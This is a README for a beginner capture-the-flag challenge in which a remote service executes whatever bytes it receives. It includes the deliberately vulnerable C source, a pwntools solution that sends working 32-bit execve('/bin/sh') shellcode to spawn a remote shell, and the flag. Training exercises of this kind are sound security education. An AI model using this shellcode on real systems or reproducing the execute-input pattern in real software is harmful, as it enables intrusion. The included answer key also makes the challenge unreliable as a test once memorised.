# Shellcoder

Difficulty Level: Easy
 
This bad boy takes in any kind of instruction and runs it. Try giving it a shellcode.
 
Connect via `nc challenge.ctf-fun.xyz 14011`

PS: Challenges in this category require a linux environment read [here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit?usp=sharing) for a guide to installing a linux VM

### Hints

- Search for 32 bit shellcode.
- You can send bytes in python like this `print('\x66\x6c\x61\x67') `


## Deployment

```bash
cd service
sudo ./shellcoder.sh &
```

## Solution
Looking at the source code we see that it takes input and tries to run it. 

```c
#include <stdio.h>

void vulnerable(){
	char buffer[64] = {0x00};

	printf("Give me a shell to run\n");
	fgets(buffer, sizeof(buffer), stdin);

	printf("Noice, executing it...\n");
	((void (*)())buffer)();
}


int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);

	vulnerable();
}
```
Search online for a 32bit shellcode and send it.

```python
"""
This exercise looks introduces shellcode. 
Just search online for a shellcode and let the program run it.

"""

from pwn import *

def main():

	# http://shell-storm.org/shellcode/files/shellcode-811.php	
	shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"
	shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
	shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
	shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"

	#io = process('./shellcoder')
	io = remote("challenge.ctf-fun.xyz", 14011)
	io.sendline(shellcode)
	io.interactive()

if __name__ == '__main__':
	main()
```


### Flag
19C4{Sh3ll_coding_iz_c00l}